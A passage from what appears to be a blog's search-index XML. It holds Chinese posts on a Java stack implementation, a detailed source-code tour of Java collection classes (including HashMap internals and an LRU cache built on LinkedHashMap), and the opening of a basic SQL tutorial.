      <tags>
        <tag>查找</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[栈]]></title>
    <url>%2F2017%2F11%2F23%2F%E6%A0%88%2F</url>
    <content type="text"><![CDATA[后入先出的数据结构 在 LIFO 数据结构中，将首先处理添加到队列中的最新元素。 与队列不同，栈是一个 LIFO 数据结构。通常，插入操作在栈中被称作入栈 push 。与队列类似，总是在堆栈的末尾添加一个新元素。但是，删除操作，退栈 pop ，将始终删除队列中相对于它的最后一个元素。 实现 - 栈123456789101112131415161718192021222324252627282930313233343536373839404142// &quot;static void main&quot; must be defined in a public class.class MyStack &#123; private List&lt;Integer&gt; data; // store elements public MyStack() &#123; data = new ArrayList&lt;&gt;(); &#125; /** Insert an element into the stack. */ public void push(int x) &#123; data.add(x); &#125; /** Checks whether the queue is empty or not. */ public boolean isEmpty() &#123; return data.isEmpty(); &#125; /** Get the top item from the queue. */ public int top() &#123; return data.get(data.size() - 1); &#125; /** Delete an element from the queue. Return true if the operation is successful. */ public boolean pop() &#123; if (isEmpty()) &#123; return false; &#125; data.remove(data.size() - 1); return true; &#125;&#125;;public class Main &#123; public static void main(String[] args) &#123; MyStack s = new MyStack(); s.push(1); s.push(2); s.push(3); for (int i = 0; i &lt; 4; ++i) &#123; if (!s.isEmpty()) &#123; System.out.println(s.top()); &#125; System.out.println(s.pop()); &#125; &#125;&#125;]]></content>
      <categories>
        <category>数据结构</category>
      </categories>
      <tags>
        <tag>线性表</tag>
        <tag>LIFO</tag>
        <tag>栈</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[java容器]]></title>
    <url>%2F2017%2F11%2F17%2Fjava%E5%AE%B9%E5%99%A8%2F</url>
    <content type="text"><![CDATA[一、概览容器主要包括 Collection 和 Map 两种，Collection 存储着对象的集合，而 Map 存储着键值对（两个对象）的映射表。 Collection 1. Set TreeSet：基于红黑树实现，支持有序性操作，例如根据一个范围查找元素的操作。但是查找效率不如 HashSet，HashSet 查找的时间复杂度为 O(1)，TreeSet 则为 O(logN)。 HashSet：基于哈希表实现，支持快速查找，但不支持有序性操作。并且失去了元素的插入顺序信息，也就是说使用 Iterator 遍历 HashSet 得到的结果是不确定的。 LinkedHashSet：具有 HashSet 的查找效率，且内部使用双向链表维护元素的插入顺序。 2. List ArrayList：基于动态数组实现，支持随机访问。 Vector：和 ArrayList 类似，但它是线程安全的。 LinkedList：基于双向链表实现，只能顺序访问，但是可以快速地在链表中间插入和删除元素。不仅如此，LinkedList 还可以用作栈、队列和双向队列。 3. Queue LinkedList：可以用它来实现双向队列。 PriorityQueue：基于堆结构实现，可以用它来实现优先队列。 Map TreeMap：基于红黑树实现。 HashMap：基于哈希表实现。 HashTable：和 HashMap 类似，但它是线程安全的，这意味着同一时刻多个线程可以同时写入 HashTable 并且不会导致数据不一致。它是遗留类，不应该去使用它。现在可以使用 ConcurrentHashMap 来支持线程安全，并且 ConcurrentHashMap 的效率会更高，因为 ConcurrentHashMap 引入了分段锁。 LinkedHashMap：使用双向链表来维护元素的顺序，顺序为插入顺序或者最近最少使用（LRU）顺序。 二、容器中的设计模式迭代器模式 Collection 继承了 Iterable 接口，其中的 iterator() 方法能够产生一个 Iterator 对象，通过这个对象就可以迭代遍历 Collection 中的元素。 从 JDK 1.5 之后可以使用 foreach 方法来遍历实现了 Iterable 接口的聚合对象。 123456List&lt;String&gt; list = new ArrayList&lt;&gt;();list.add("a");list.add("b");for (String item : list) &#123; System.out.println(item);&#125; 适配器模式java.util.Arrays#asList() 可以把数组类型转换为 List 类型。 12@SafeVarargspublic static &lt;T&gt; List&lt;T&gt; asList(T... a) 应该注意的是 asList() 的参数为泛型的变长参数，不能使用基本类型数组作为参数，只能使用相应的包装类型数组。 12Integer[] arr = &#123;1, 2, 3&#125;;List list = Arrays.asList(arr); 也可以使用以下方式调用 asList()： 1List list = Arrays.asList(1, 2, 3); 三、源码分析如果没有特别说明，以下源码分析基于 JDK 1.8。 在 IDEA 中 double shift 调出 Search EveryWhere，查找源码文件，找到之后就可以阅读源码。 ArrayList1. 概览因为 ArrayList 是基于数组实现的，所以支持快速随机访问。RandomAccess 接口标识着该类支持快速随机访问。 12public class ArrayList&lt;E&gt; extends AbstractList&lt;E&gt; implements List&lt;E&gt;, RandomAccess, Cloneable, java.io.Serializable 数组的默认大小为 10。 1private static final int DEFAULT_CAPACITY = 10; 2. 扩容添加元素时使用 ensureCapacityInternal() 方法来保证容量足够，如果不够时，需要使用 grow() 方法进行扩容，新容量的大小为 oldCapacity + (oldCapacity &gt;&gt; 1)，也就是旧容量的 1.5 倍。 扩容操作需要调用 Arrays.copyOf() 把原数组整个复制到新数组中，这个操作代价很高，因此最好在创建 ArrayList 对象时就指定大概的容量大小，减少扩容操作的次数。 12345678910111213141516171819202122232425262728293031public boolean add(E e) &#123; ensureCapacityInternal(size + 1); // Increments modCount!! elementData[size++] = e; return true;&#125;private void ensureCapacityInternal(int minCapacity) &#123; if (elementData == DEFAULTCAPACITY_EMPTY_ELEMENTDATA) &#123; minCapacity = Math.max(DEFAULT_CAPACITY, minCapacity); &#125; ensureExplicitCapacity(minCapacity);&#125;private void ensureExplicitCapacity(int minCapacity) &#123; modCount++; // overflow-conscious code if (minCapacity - elementData.length &gt; 0) grow(minCapacity);&#125;private void grow(int minCapacity) &#123; // overflow-conscious code int oldCapacity = elementData.length; int newCapacity = oldCapacity + (oldCapacity &gt;&gt; 1); if (newCapacity - minCapacity &lt; 0) newCapacity = minCapacity; if (newCapacity - MAX_ARRAY_SIZE &gt; 0) newCapacity = hugeCapacity(minCapacity); // minCapacity is usually close to size, so this is a win: elementData = Arrays.copyOf(elementData, newCapacity);&#125; 3. 删除元素需要调用 System.arraycopy() 将 index+1 后面的元素都复制到 index 位置上，该操作的时间复杂度为 O(N)，可以看出 ArrayList 删除元素的代价是非常高的。 12345678910public E remove(int index) &#123; rangeCheck(index); modCount++; E oldValue = elementData(index); int numMoved = size - index - 1; if (numMoved &gt; 0) System.arraycopy(elementData, index+1, elementData, index, numMoved); elementData[--size] = null; // clear to let GC do its work return oldValue;&#125; 4. Fail-FastmodCount 用来记录 ArrayList 结构发生变化的次数。结构发生变化是指添加或者删除至少一个元素的所有操作，或者是调整内部数组的大小，仅仅只是设置元素的值不算结构发生变化。 在进行序列化或者迭代等操作时，需要比较操作前后 modCount 是否改变，如果改变了需要抛出 ConcurrentModificationException。 123456789101112131415161718private void writeObject(java.io.ObjectOutputStream s) throws java.io.IOException&#123; // Write out element count, and any hidden stuff int expectedModCount = modCount; s.defaultWriteObject(); // Write out size as capacity for behavioural compatibility with clone() s.writeInt(size); // Write out all elements in the proper order. for (int i=0; i&lt;size; i++) &#123; s.writeObject(elementData[i]); &#125; if (modCount != expectedModCount) &#123; throw new ConcurrentModificationException(); &#125;&#125; 5. 序列化ArrayList 基于数组实现，并且具有动态扩容特性，因此保存元素的数组不一定都会被使用，那么就没必要全部进行序列化。 保存元素的数组 elementData 使用 transient 修饰，该关键字声明数组默认不会被序列化。 1transient Object[] elementData; // non-private to simplify nested class access ArrayList 实现了 writeObject() 和 readObject() 来控制只序列化数组中有元素填充那部分内容。 123456789101112131415161718192021private void readObject(java.io.ObjectInputStream s) throws java.io.IOException, ClassNotFoundException &#123; elementData = EMPTY_ELEMENTDATA; // Read in size, and any hidden stuff s.defaultReadObject(); // Read in capacity s.readInt(); // ignored if (size &gt; 0) &#123; // be like clone(), allocate array based upon size not capacity ensureCapacityInternal(size); Object[] a = elementData; // Read in all elements in the proper order. for (int i=0; i&lt;size; i++) &#123; a[i] = s.readObject(); &#125; &#125;&#125; 123456789101112131415161718private void writeObject(java.io.ObjectOutputStream s) throws java.io.IOException&#123; // Write out element count, and any hidden stuff int expectedModCount = modCount; s.defaultWriteObject(); // Write out size as capacity for behavioural compatibility with clone() s.writeInt(size); // Write out all elements in the proper order. for (int i=0; i&lt;size; i++) &#123; s.writeObject(elementData[i]); &#125; if (modCount != expectedModCount) &#123; throw new ConcurrentModificationException(); &#125;&#125; 序列化时需要使用 ObjectOutputStream 的 writeObject() 将对象转换为字节流并输出。而 writeObject() 方法在传入的对象存在 writeObject() 的时候会去反射调用该对象的 writeObject() 来实现序列化。反序列化使用的是 ObjectInputStream 的 readObject() 方法，原理类似。 123ArrayList list = new ArrayList();ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(file));oos.writeObject(list); Vector1. 同步它的实现与 ArrayList 类似，但是使用了 synchronized 进行同步。 12345678910111213public synchronized boolean add(E e) &#123; modCount++; ensureCapacityHelper(elementCount + 1); elementData[elementCount++] = e; return true;&#125;public synchronized E get(int index) &#123; if (index &gt;= elementCount) throw new ArrayIndexOutOfBoundsException(index); return elementData(index);&#125; 2. 与 ArrayList 的比较 Vector 是同步的，因此开销就比 ArrayList 要大，访问速度更慢。最好使用 ArrayList 而不是 Vector，因为同步操作完全可以由程序员自己来控制； Vector 每次扩容请求其大小的 2 倍空间，而 ArrayList 是 1.5 倍。 3. 替代方案可以使用 Collections.synchronizedList(); 得到一个线程安全的 ArrayList。 12List&lt;String&gt; list = new ArrayList&lt;&gt;();List&lt;String&gt; synList = Collections.synchronizedList(list); 也可以使用 concurrent 并发包下的 CopyOnWriteArrayList 类。 1List&lt;String&gt; list = new CopyOnWriteArrayList&lt;&gt;(); CopyOnWriteArrayList读写分离写操作在一个复制的数组上进行，读操作还是在原始数组中进行，读写分离，互不影响。 写操作需要加锁，防止并发写入时导致写入数据丢失。 写操作结束之后需要把原始数组指向新的复制数组。 123456789101112131415161718public boolean add(E e) &#123; final ReentrantLock lock = this.lock; lock.lock(); try &#123; Object[] elements = getArray(); int len = elements.length; Object[] newElements = Arrays.copyOf(elements, len + 1); newElements[len] = e; setArray(newElements); return true; &#125; finally &#123; lock.unlock(); &#125;&#125;final void setArray(Object[] a) &#123; array = a;&#125; 1234@SuppressWarnings("unchecked")private E get(Object[] a, int index) &#123; return (E) a[index];&#125; 适用场景CopyOnWriteArrayList 在写操作的同时允许读操作，大大提高了读操作的性能，因此很适合读多写少的应用场景。 但是 CopyOnWriteArrayList 有其缺陷： 内存占用：在写操作时需要复制一个新的数组，使得内存占用为原来的两倍左右； 数据不一致：读操作不能读取实时性的数据，因为部分写操作的数据还未同步到读数组中。 所以 CopyOnWriteArrayList 不适合内存敏感以及对实时性要求很高的场景。 LinkedList1. 概览基于双向链表实现，使用 Node 存储链表节点信息。 12345private static class Node&lt;E&gt; &#123; E item; Node&lt;E&gt; next; Node&lt;E&gt; prev;&#125; 每个链表存储了 first 和 last 指针： 12transient Node&lt;E&gt; first;transient Node&lt;E&gt; last; 2. 与 ArrayList 的比较 ArrayList 基于动态数组实现，LinkedList 基于双向链表实现； ArrayList 支持随机访问，LinkedList 不支持； LinkedList 在任意位置添加删除元素更快。 HashMap为了便于理解，以下源码分析以 JDK 1.7 为主。 1. 存储结构内部包含了一个 Entry 类型的数组 table。 1transient Entry[] table; Entry 存储着键值对。它包含了四个字段，从 next 字段我们可以看出 Entry 是一个链表。即数组中的每个位置被当成一个桶，一个桶存放一个链表。HashMap 使用拉链法来解决冲突，同一个链表中存放哈希值相同的 Entry。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950static class Entry&lt;K,V&gt; implements Map.Entry&lt;K,V&gt; &#123; final K key; V value; Entry&lt;K,V&gt; next; int hash; Entry(int h, K k, V v, Entry&lt;K,V&gt; n) &#123; value = v; next = n; key = k; hash = h; &#125; public final K getKey() &#123; return key; &#125; public final V getValue() &#123; return value; &#125; public final V setValue(V newValue) &#123; V oldValue = value; value = newValue; return oldValue; &#125; public final boolean equals(Object o) &#123; if (!(o instanceof Map.Entry)) return false; Map.Entry e = (Map.Entry)o; Object k1 = getKey(); Object k2 = e.getKey(); if (k1 == k2 || (k1 != null &amp;&amp; k1.equals(k2))) &#123; Object v1 = getValue(); Object v2 = e.getValue(); if (v1 == v2 || (v1 != null &amp;&amp; v1.equals(v2))) return true; &#125; return false; &#125; public final int hashCode() &#123; return Objects.hashCode(getKey()) ^ Objects.hashCode(getValue()); &#125; public final String toString() &#123; return getKey() + "=" + getValue(); &#125;&#125; 2. 拉链法的工作原理1234HashMap&lt;String, String&gt; map = new HashMap&lt;&gt;();map.put("K1", "V1");map.put("K2", "V2");map.put("K3", "V3"); 新建一个 HashMap，默认大小为 16； 插入 &lt;K1,V1&gt; 键值对，先计算 K1 的 hashCode 为 115，使用除留余数法得到所在的桶下标 115%16=3。 插入 &lt;K2,V2&gt; 键值对，先计算 K2 的 hashCode 为 118，使用除留余数法得到所在的桶下标 118%16=6。 插入 &lt;K3,V3&gt; 键值对，先计算 K3 的 hashCode 为 118，使用除留余数法得到所在的桶下标 118%16=6，插在 &lt;K2,V2&gt; 前面。 应该注意到链表的插入是以头插法方式进行的，例如上面的 &lt;K3,V3&gt; 不是插在 &lt;K2,V2&gt; 后面，而是插入在链表头部。 查找需要分成两步进行： 计算键值对所在的桶； 在链表上顺序查找，时间复杂度显然和链表的长度成正比。 3. put 操作1234567891011121314151617181920212223242526public V put(K key, V value) &#123; if (table == EMPTY_TABLE) &#123; inflateTable(threshold); &#125; // 键为 null 单独处理 if (key == null) return putForNullKey(value); int hash = hash(key); // 确定桶下标 int i = indexFor(hash, table.length); // 先找出是否已经存在键为 key 的键值对，如果存在的话就更新这个键值对的值为 value for (Entry&lt;K,V&gt; e = table[i]; e != null; e = e.next) &#123; Object k; if (e.hash == hash &amp;&amp; ((k = e.key) == key || key.equals(k))) &#123; V oldValue = e.value; e.value = value; e.recordAccess(this); return oldValue; &#125; &#125; modCount++; // 插入新键值对 addEntry(hash, key, value, i); return null;&#125; HashMap 允许插入键为 null 的键值对。但是因为无法调用 null 的 hashCode() 方法，也就无法确定该键值对的桶下标，只能通过强制指定一个桶下标来存放。HashMap 使用第 0 个桶存放键为 null 的键值对。 12345678910111213private V putForNullKey(V value) &#123; for (Entry&lt;K,V&gt; e = table[0]; e != null; e = e.next) &#123; if (e.key == null) &#123; V oldValue = e.value; e.value = value; e.recordAccess(this); return oldValue; &#125; &#125; modCount++; addEntry(0, null, value, 0); return null;&#125; 使用链表的头插法，也就是新的键值对插在链表的头部，而不是链表的尾部。 12345678910111213141516void addEntry(int hash, K key, V value, int bucketIndex) &#123; if ((size &gt;= threshold) &amp;&amp; (null != table[bucketIndex])) &#123; resize(2 * table.length); hash = (null != key) ? hash(key) : 0; bucketIndex = indexFor(hash, table.length); &#125; createEntry(hash, key, value, bucketIndex);&#125;void createEntry(int hash, K key, V value, int bucketIndex) &#123; Entry&lt;K,V&gt; e = table[bucketIndex]; // 头插法，链表头部指向新的键值对 table[bucketIndex] = new Entry&lt;&gt;(hash, key, value, e); size++;&#125; 123456Entry(int h, K k, V v, Entry&lt;K,V&gt; n) &#123; value = v; next = n; key = k; hash = h;&#125; 4. 确定桶下标很多操作都需要先确定一个键值对所在的桶下标。 12int hash = hash(key);int i = indexFor(hash, table.length); 4.1 计算 hash 值 1234567891011121314final int hash(Object k) &#123; int h = hashSeed; if (0 != h &amp;&amp; k instanceof String) &#123; return sun.misc.Hashing.stringHash32((String) k); &#125; h ^= k.hashCode(); // This function ensures that hashCodes that differ only by // constant multiples at each bit position have a bounded // number of collisions (approximately 8 at default load factor). h ^= (h &gt;&gt;&gt; 20) ^ (h &gt;&gt;&gt; 12); return h ^ (h &gt;&gt;&gt; 7) ^ (h &gt;&gt;&gt; 4);&#125; 123public final int hashCode() &#123; return Objects.hashCode(key) ^ Objects.hashCode(value);&#125; 4.2 取模 令 x = 1&lt;&lt;4，即 x 为 2 的 4 次方，它具有以下性质： 12x : 00010000x-1 : 00001111 令一个数 y 与 x-1 做与运算，可以去除 y 位级表示的第 4 位以上数： 123y : 10110010x-1 : 00001111y&amp;(x-1) : 00000010 这个性质和 y 对 x 取模效果是一样的： 123y : 10110010x : 00010000y%x : 00000010 我们知道，位运算的代价比求模运算小的多，因此在进行这种计算时用位运算的话能带来更高的性能。 确定桶下标的最后一步是将 key 的 hash 值对桶个数取模：hash%capacity，如果能保证 capacity 为 2 的 n 次方，那么就可以将这个操作转换为位运算。 123static int indexFor(int h, int length) &#123; return h &amp; (length-1);&#125; 5. 扩容-基本原理设 HashMap 的 table 长度为 M，需要存储的键值对数量为 N，如果哈希函数满足均匀性的要求，那么每条链表的长度大约为 N/M，因此平均查找次数的复杂度为 O(N/M)。 为了让查找的成本降低，应该尽可能使得 N/M 尽可能小，因此需要保证 M 尽可能大，也就是说 table 要尽可能大。HashMap 采用动态扩容来根据当前的 N 值来调整 M 值，使得空间效率和时间效率都能得到保证。 和扩容相关的参数主要有：capacity、size、threshold 和 load_factor。 参数 含义 capacity table 的容量大小，默认为 16。需要注意的是 capacity 必须保证为 2 的 n 次方。 size 键值对数量。 threshold size 的临界值，当 size 大于等于 threshold 就必须进行扩容操作。 loadFactor 装载因子，table 能够使用的比例，threshold = capacity * loadFactor。 123456789101112131415static final int DEFAULT_INITIAL_CAPACITY = 16;static final int MAXIMUM_CAPACITY = 1 &lt;&lt; 30;static final float DEFAULT_LOAD_FACTOR = 0.75f;transient Entry[] table;transient int size;int threshold;final float loadFactor;transient int modCount; 从下面的添加元素代码中可以看出，当需要扩容时，令 capacity 为原来的两倍。 123456void addEntry(int hash, K key, V value, int bucketIndex) &#123; Entry&lt;K,V&gt; e = table[bucketIndex]; table[bucketIndex] = new Entry&lt;&gt;(hash, key, value, e); if (size++ &gt;= threshold) resize(2 * table.length);&#125; 扩容使用 resize() 实现，需要注意的是，扩容操作同样需要把 oldTable 的所有键值对重新插入 newTable 中，因此这一步是很费时的。 123456789101112131415161718192021222324252627282930void resize(int newCapacity) &#123; Entry[] oldTable = table; int oldCapacity = oldTable.length; if (oldCapacity == MAXIMUM_CAPACITY) &#123; threshold = Integer.MAX_VALUE; return; &#125; Entry[] newTable = new Entry[newCapacity]; transfer(newTable); table = newTable; threshold = (int)(newCapacity * loadFactor);&#125;void transfer(Entry[] newTable) &#123; Entry[] src = table; int newCapacity = newTable.length; for (int j = 0; j &lt; src.length; j++) &#123; Entry&lt;K,V&gt; e = src[j]; if (e != null) &#123; src[j] = null; do &#123; Entry&lt;K,V&gt; next = e.next; int i = indexFor(e.hash, newCapacity); e.next = newTable[i]; newTable[i] = e; e = next; &#125; while (e != null); &#125; &#125;&#125; 6. 扩容-重新计算桶下标在进行扩容时，需要把键值对重新放到对应的桶上。HashMap 使用了一个特殊的机制，可以降低重新计算桶下标的操作。 假设原数组长度 capacity 为 16，扩容之后 new capacity 为 32： 12capacity : 00010000new capacity : 00100000 对于一个 Key， 它的哈希值如果在第 5 位上为 0，那么取模得到的结果和之前一样； 如果为 1，那么得到的结果为原来的结果 +16。 7. 计算数组容量HashMap 构造函数允许用户传入的容量不是 2 的 n 次方，因为它可以自动地将传入的容量转换为 2 的 n 次方。 先考虑如何求一个数的掩码，对于 10010000，它的掩码为 11111111，可以使用以下方法得到： 123mask |= mask &gt;&gt; 1 11011000mask |= mask &gt;&gt; 2 11111110mask |= mask &gt;&gt; 4 11111111 mask+1 是大于原始数字的最小的 2 的 n 次方。 12num 10010000mask+1 100000000 以下是 HashMap 中计算数组容量的代码： 123456789static final int tableSizeFor(int cap) &#123; int n = cap - 1; n |= n &gt;&gt;&gt; 1; n |= n &gt;&gt;&gt; 2; n |= n &gt;&gt;&gt; 4; n |= n &gt;&gt;&gt; 8; n |= n &gt;&gt;&gt; 16; return (n &lt; 0) ? 1 : (n &gt;= MAXIMUM_CAPACITY) ? MAXIMUM_CAPACITY : n + 1;&#125; 8. 链表转红黑树从 JDK 1.8 开始，一个桶存储的链表长度大于 8 时会将链表转换为红黑树。 9. 与 HashTable 的比较 HashTable 使用 synchronized 来进行同步。 HashMap 可以插入键为 null 的 Entry。 HashMap 的迭代器是 fail-fast 迭代器。 HashMap 不能保证随着时间的推移 Map 中的元素次序是不变的。 ConcurrentHashMap1. 存储结构123456static final class HashEntry&lt;K,V&gt; &#123; final int hash; final K key; volatile V value; volatile HashEntry&lt;K,V&gt; next;&#125; ConcurrentHashMap 和 HashMap 实现上类似，最主要的差别是 ConcurrentHashMap 采用了分段锁（Segment），每个分段锁维护着几个桶（HashEntry），多个线程可以同时访问不同分段锁上的桶，从而使其并发度更高（并发度就是 Segment 的个数）。 Segment 继承自 ReentrantLock。 1234567891011121314151617static final class Segment&lt;K,V&gt; extends ReentrantLock implements Serializable &#123; private static final long serialVersionUID = 2249069246763182397L; static final int MAX_SCAN_RETRIES = Runtime.getRuntime().availableProcessors() &gt; 1 ? 64 : 1; transient volatile HashEntry&lt;K,V&gt;[] table; transient int count; transient int modCount; transient int threshold; final float loadFactor;&#125; 1final Segment&lt;K,V&gt;[] segments; 默认的并发级别为 16，也就是说默认创建 16 个 Segment。 1static final int DEFAULT_CONCURRENCY_LEVEL = 16; 2. size 操作每个 Segment 维护了一个 count 变量来统计该 Segment 中的键值对个数。 12345/** * The number of elements. Accessed only either within locks * or among other volatile reads that maintain visibility. */transient int count; 在执行 size 操作时，需要遍历所有 Segment 然后把 count 累计起来。 ConcurrentHashMap 在执行 size 操作时先尝试不加锁，如果连续两次不加锁操作得到的结果一致，那么可以认为这个结果是正确的。 尝试次数使用 RETRIES_BEFORE_LOCK 定义，该值为 2，retries 初始值为 -1，因此尝试次数为 3。 如果尝试的次数超过 3 次，就需要对每个 Segment 加锁。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950/** * Number of unsynchronized retries in size and containsValue * methods before resorting to locking. This is used to avoid * unbounded retries if tables undergo continuous modification * which would make it impossible to obtain an accurate result. */static final int RETRIES_BEFORE_LOCK = 2;public int size() &#123; // Try a few times to get accurate count. On failure due to // continuous async changes in table, resort to locking. final Segment&lt;K,V&gt;[] segments = this.segments; int size; boolean overflow; // true if size overflows 32 bits long sum; // sum of modCounts long last = 0L; // previous sum int retries = -1; // first iteration isn't retry try &#123; for (;;) &#123; // 超过尝试次数，则对每个 Segment 加锁 if (retries++ == RETRIES_BEFORE_LOCK) &#123; for (int j = 0; j &lt; segments.length; ++j) ensureSegment(j).lock(); // force creation &#125; sum = 0L; size = 0; overflow = false; for (int j = 0; j &lt; segments.length; ++j) &#123; Segment&lt;K,V&gt; seg = segmentAt(segments, j); if (seg != null) &#123; sum += seg.modCount; int c = seg.count; if (c &lt; 0 || (size += c) &lt; 0) overflow = true; &#125; &#125; // 连续两次得到的结果一致，则认为这个结果是正确的 if (sum == last) break; last = sum; &#125; &#125; finally &#123; if (retries &gt; RETRIES_BEFORE_LOCK) &#123; for (int j = 0; j &lt; segments.length; ++j) segmentAt(segments, j).unlock(); &#125; &#125; return overflow ? Integer.MAX_VALUE : size;&#125; 3. JDK 1.8 的改动JDK 1.7 使用分段锁机制来实现并发更新操作，核心类为 Segment，它继承自重入锁 ReentrantLock，并发度与 Segment 数量相等。 JDK 1.8 使用了 CAS 操作来支持更高的并发度，在 CAS 操作失败时使用内置锁 synchronized。 并且 JDK 1.8 的实现也在链表过长时会转换为红黑树。 LinkedHashMap存储结构继承自 HashMap，因此具有和 HashMap 一样的快速查找特性。 1public class LinkedHashMap&lt;K,V&gt; extends HashMap&lt;K,V&gt; implements Map&lt;K,V&gt; 内部维护了一个双向链表，用来维护插入顺序或者 LRU 顺序。 123456789/** * The head (eldest) of the doubly linked list. */transient LinkedHashMap.Entry&lt;K,V&gt; head;/** * The tail (youngest) of the doubly linked list. */transient LinkedHashMap.Entry&lt;K,V&gt; tail; accessOrder 决定了顺序，默认为 false，此时维护的是插入顺序。 1final boolean accessOrder; LinkedHashMap 最重要的是以下用于维护顺序的函数，它们会在 put、get 等方法中调用。 12void afterNodeAccess(Node&lt;K,V&gt; p) &#123; &#125;void afterNodeInsertion(boolean evict) &#123; &#125; afterNodeAccess()当一个节点被访问时，如果 accessOrder 为 true，则会将该节点移到链表尾部。也就是说指定为 LRU 顺序之后，在每次访问一个节点时，会将这个节点移到链表尾部，保证链表尾部是最近访问的节点，那么链表首部就是最近最久未使用的节点。 123456789101112131415161718192021222324void afterNodeAccess(Node&lt;K,V&gt; e) &#123; // move node to last LinkedHashMap.Entry&lt;K,V&gt; last; if (accessOrder &amp;&amp; (last = tail) != e) &#123; LinkedHashMap.Entry&lt;K,V&gt; p = (LinkedHashMap.Entry&lt;K,V&gt;)e, b = p.before, a = p.after; p.after = null; if (b == null) head = a; else b.after = a; if (a != null) a.before = b; else last = b; if (last == null) head = p; else &#123; p.before = last; last.after = p; &#125; tail = p; ++modCount; &#125;&#125; afterNodeInsertion()在 put 等操作之后执行，当 removeEldestEntry() 方法返回 true 时会移除最晚的节点，也就是链表首部节点 first。 evict 只有在构建 Map 的时候才为 false，在这里为 true。 1234567void afterNodeInsertion(boolean evict) &#123; // possibly remove eldest LinkedHashMap.Entry&lt;K,V&gt; first; if (evict &amp;&amp; (first = head) != null &amp;&amp; removeEldestEntry(first)) &#123; K key = first.key; removeNode(hash(key), key, null, false, true); &#125;&#125; removeEldestEntry() 默认为 false，如果需要让它为 true，需要继承 LinkedHashMap 并且覆盖这个方法的实现，这在实现 LRU 的缓存中特别有用，通过移除最近最久未使用的节点，从而保证缓存空间足够，并且缓存的数据都是热点数据。 123protected boolean removeEldestEntry(Map.Entry&lt;K,V&gt; eldest) &#123; return false;&#125; LRU 缓存以下是使用 LinkedHashMap 实现的一个 LRU 缓存： 设定最大缓存空间 MAX_ENTRIES 为 3； 使用 LinkedHashMap 的构造函数将 accessOrder 设置为 true，开启 LRU 顺序； 覆盖 removeEldestEntry() 方法实现，在节点多于 MAX_ENTRIES 就会将最近最久未使用的数据移除。 1234567891011class LRUCache&lt;K, V&gt; extends LinkedHashMap&lt;K, V&gt; &#123; private static final int MAX_ENTRIES = 3; protected boolean removeEldestEntry(Map.Entry eldest) &#123; return size() &gt; MAX_ENTRIES; &#125; LRUCache() &#123; super(MAX_ENTRIES, 0.75f, true); &#125;&#125; 123456789public static void main(String[] args) &#123; LRUCache&lt;Integer, String&gt; cache = new LRUCache&lt;&gt;(); cache.put(1, "a"); cache.put(2, "b"); cache.put(3, "c"); cache.get(1); cache.put(4, "d"); System.out.println(cache.keySet());&#125; 1[3, 1, 4] WeakHashMap存储结构WeakHashMap 的 Entry 继承自 WeakReference，被 WeakReference 关联的对象在下一次垃圾回收时会被回收。 WeakHashMap 主要用来实现缓存，通过使用 WeakHashMap 来引用缓存对象，由 JVM 对这部分缓存进行回收。 1private static class Entry&lt;K,V&gt; extends WeakReference&lt;Object&gt; implements Map.Entry&lt;K,V&gt; ConcurrentCacheTomcat 中的 ConcurrentCache 使用了 WeakHashMap 来实现缓存功能。 ConcurrentCache 采取的是分代缓存： 经常使用的对象放入 eden 中，eden 使用 ConcurrentHashMap 实现，不用担心会被回收（伊甸园）； 不常用的对象放入 longterm，longterm 使用 WeakHashMap 实现，这些老对象会被垃圾收集器回收。 当调用 get() 方法时，会先从 eden 区获取，如果没有找到的话再到 longterm 获取，当从 longterm 获取到就把对象放入 eden 中，从而保证经常被访问的节点不容易被回收。 当调用 put() 方法时，如果 eden 的大小超过了 size，那么就将 eden 中的所有对象都放入 longterm 中，利用虚拟机回收掉一部分不经常使用的对象。 1234567891011121314151617181920212223242526272829303132public final class ConcurrentCache&lt;K, V&gt; &#123; private final int size; private final Map&lt;K, V&gt; eden; private final Map&lt;K, V&gt; longterm; public ConcurrentCache(int size) &#123; this.size = size; this.eden = new ConcurrentHashMap&lt;&gt;(size); this.longterm = new WeakHashMap&lt;&gt;(size); &#125; public V get(K k) &#123; V v = this.eden.get(k); if (v == null) &#123; v = this.longterm.get(k); if (v != null) this.eden.put(k, v); &#125; return v; &#125; public void put(K k, V v) &#123; if (this.eden.size() &gt;= size) &#123; this.longterm.putAll(this.eden); this.eden.clear(); &#125; this.eden.put(k, v); &#125;&#125;]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>java容器</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL]]></title>
    <url>%2F2017%2F11%2F15%2FSQL%2F</url>
    <content type="text"><![CDATA[一、基础模式定义了数据如何存储、存储什么样的数据以及数据如何分解等信息，数据库和表都有模式。 主键的值不允许修改，也不允许复用（不能使用已经删除的主键值赋给新数据行的主键）。 SQL（Structured Query Language)，标准 SQL 由 ANSI 标准委员会管理，从而称为 ANSI SQL。各个 DBMS 都有自己的实现，如 PL/SQL、Transact-SQL 等。 SQL 语句不区分大小写，但是数据库表名、列名和值是否区分依赖于具体的 DBMS 以及配置。 SQL 支持以下三种注释： 12345# 注释SELECT *FROM mytable; -- 注释/* 注释1 注释2 */ 数据库创建与使用： 12CREATE DATABASE test;USE test; 二、创建表123456CREATE TABLE mytable ( id INT NOT NULL AUTO_INCREMENT, col1 INT NOT NULL DEFAULT 1, col2 VARCHAR(45) NULL, col3 DATE NULL, PRIMARY KEY (`id`)); 三、修改表添加列 12ALTER TABLE mytableADD col CHAR(20); 删除列 12ALTER TABLE mytableDROP COLUMN col; 删除表 1DROP TABLE mytable; 四、插入普通插入 12INSERT INTO mytable(col1, col2)VALUES(val1, val2); 插入检索出来的数据 123INSERT INTO mytable1(col1, col2)SELECT col1, col2FROM mytable2; 将一个表的内容插入到一个新表 12CREATE TABLE newtable ASSELECT * FROM mytable; 五、更新123UPDATE mytableSET col = valWHERE id = 1; 六、删除12DELETE FROM mytableWHERE id = 1; TRUNCATE TABLE 可以清空表，也就是删除所有行。 1TRUNCATE TABLE mytable; 使用更新和删除操作时一定要用 WHERE 子句，不然会把整张表的数据都破坏。可以先用 SELECT 语句进行测试，防止错误删除。 七、查询DISTINCT相同值只会出现一次。它作用于所有列，也就是说所有列的值都相同才算相同。 12SELECT DISTINCT col1, col2FROM mytable; 